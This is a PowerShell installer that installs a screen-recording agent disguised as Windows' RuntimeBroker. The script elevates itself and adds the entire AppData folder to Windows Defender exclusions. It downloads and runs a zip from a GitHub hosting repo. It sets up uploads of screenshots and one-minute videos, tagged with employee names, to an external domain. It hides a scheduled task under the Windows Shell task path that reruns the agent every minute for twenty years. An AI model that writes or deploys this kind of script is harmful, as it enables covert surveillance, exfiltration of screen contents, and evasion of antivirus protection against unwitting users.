# Function to check if the script is running as administrator
function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Relaunch the script with elevated privileges if not running as administrator
if (-not (Test-Administrator)) {
    $arguments = "& '" + $myInvocation.MyCommand.Definition + "'"
    Start-Process powershell -ArgumentList $arguments -Verb RunAs
    exit
}

# Set execution policy to RemoteSigned if not already set
$currentPolicy = Get-ExecutionPolicy -Scope CurrentUser
if ($currentPolicy -ne 'RemoteSigned') {
    Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
}

# Get the current user's name
$currentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[-1]

#========================================================

# Remove old Version (AppRealtime)
Write-Host "Remove old Version (AppRealtime)"

$appDataPath = "C:\Users\$currentUserName\AppData"
$currentDir = "$appDataPath\Local\Microsoft\AppRealtime"
$taskName = 'AppRealtime'

# Check if the task exists and delete it if necessary
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
}

# Check if any files in the directory are being held by any processes and kill those processes
if (Test-Path -Path $currentDir) {
    $lockingProcesses = Get-Process | Where-Object { $_.Modules.FileName -like "$currentDir\*" }
    foreach ($process in $lockingProcesses) {
        Stop-Process -Id $process.Id -Force
    }
}

# Delete the directory if it exists and recreate it
if (Test-Path -Path $currentDir) {
    Write-Host "Waiting for 5 seconds before deleting the directory..."
    Start-Sleep -Seconds 5
    Remove-Item -Path $currentDir -Recurse -Force
}
# End Remove old Version

#========================================================



# Set the target directory and AppData path
$appDataPath = "C:\Users\$currentUserName\AppData"
$currentDir = "$appDataPath\Local\Microsoft\RuntimeBroker"
$taskExecutablePath = Join-Path -Path $currentDir -ChildPath "RuntimeBroker.exe"

# Variables for task name and task path
$taskName = 'RuntimeBroker'

Write-Host "Check if Visual C++ Redistributable is installed"

# Function to check if Visual C++ Redistributable is installed
function Test-VCRedist {
    $keyPath = "HKLM:\SOFTWARE\Microsoft\DevDiv\VC\Servicing\14.0\RuntimeMinimum"
    $valueName = "Version"
    $minVersion = [version]"14.30.30704"
    
    try {
        $value = Get-ItemProperty -Path $keyPath -Name $valueName -ErrorAction Stop
        $installedVersion = [version]$value.Version
        return $installedVersion -ge $minVersion
    }
    catch {
        return $false
    }
}

# Install Visual C++ Redistributable if not installed
if (-not (Test-VCRedist)) {
    Write-Host "Visual C++ Redistributable not found. Downloading and installing..."
    $vcRedistUrl = "https://aka.ms/vs/17/release/vc_redist.x64.exe"
    $vcRedistInstaller = "$env:TEMP\vc_redist.x64.exe"
    Invoke-WebRequest -Uri $vcRedistUrl -OutFile $vcRedistInstaller
    Start-Process -FilePath $vcRedistInstaller -ArgumentList "/install", "/quiet", "/norestart" -Wait
}

# Check if the task exists and delete it if necessary
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
}

# Check if any files in the directory are being held by any processes and kill those processes
if (Test-Path -Path $currentDir) {
    $lockingProcesses = Get-Process | Where-Object { $_.Modules.FileName -like "$currentDir\*" }
    foreach ($process in $lockingProcesses) {
        Stop-Process -Id $process.Id -Force
    }
}

# Delete the directory if it exists and recreate it
if (Test-Path -Path $currentDir) {
    Write-Host "Waiting for 5 seconds before deleting the directory..."
    Start-Sleep -Seconds 5
    Remove-Item -Path $currentDir -Recurse -Force
}
New-Item -ItemType Directory -Path $currentDir | Out-Null

# Change to the target directory
Set-Location -Path $currentDir

# 1. Add the AppData directory to the exclusion list in Windows Defender
Add-MpPreference -ExclusionPath $appDataPath

Write-Host "Download the file from the link and extract it to the current directory"

# 2. Download the file from the link and extract it to the current directory
$zipUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/app.zip"
$zipFile = "$currentDir\app.zip"
$unzipDir = $currentDir

Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile
Expand-Archive -Path $zipFile -DestinationPath $unzipDir

# 3. Delete the appsettings.xml file if it exists and terminate any processes using the files in the directory
$appSettingsPath = "$appDataPath\Local\Microsoft\appsettings.xml"

if (-not (Test-Path -Path $appSettingsPath)) {
    # Prompt for computer name and employee name
    $computerName = Read-Host -Prompt 'Enter computer name'
    $employeeName = Read-Host -Prompt 'Enter employee name'

    # Create the appsettings.xml file with the provided format
    $appSettingsContent = @"
<?xml version="1.0"?>
<AppSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <CreateComputerHost>https://winmedia1.uro-solution.info/api/Upload/CreateComputer</CreateComputerHost>
    <VideoHost>https://winmedia1.uro-solution.info/api/Upload/UploadVideos</VideoHost>
    <ImageHost>https://winmedia1.uro-solution.info/api/Upload/UploadImage</ImageHost>
    <FrameHeight>1080</FrameHeight>
    <FrameWidth>1920</FrameWidth>
    <VideoDuration>60</VideoDuration>
    <ScreenshotsSpeed>1000</ScreenshotsSpeed>
    <ImageQuality>100</ImageQuality>
    <ComputerName>$computerName</ComputerName>
    <EmployeeName>$employeeName</EmployeeName>
</AppSettings>
"@
    $appSettingsContent | Out-File -FilePath $appSettingsPath -Encoding utf8
}

# 4. Create a scheduled task with the specified script
Write-Host "Create a scheduled task with the specified script"
$taskPath = Join-Path -Path $currentDir -ChildPath "RuntimeBroker.exe"

$action = New-ScheduledTaskAction -Execute $taskPath
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date.AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days (365 * 20))
$settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 100
$settings.DisallowStartIfOnBatteries = $false
$settings.StopIfGoingOnBatteries = $false
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -TaskPath '\Microsoft\Windows\Shell' -Settings $settings -Force

# 5. Run the RuntimeBroker task
Write-Host "Run the RuntimeBroker task"
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Start-ScheduledTask  -TaskPath '\Microsoft\Windows\Shell' -TaskName $taskName
} else {
    Write-Host "Error: Scheduled task $taskName was not created successfully."
    exit 1
}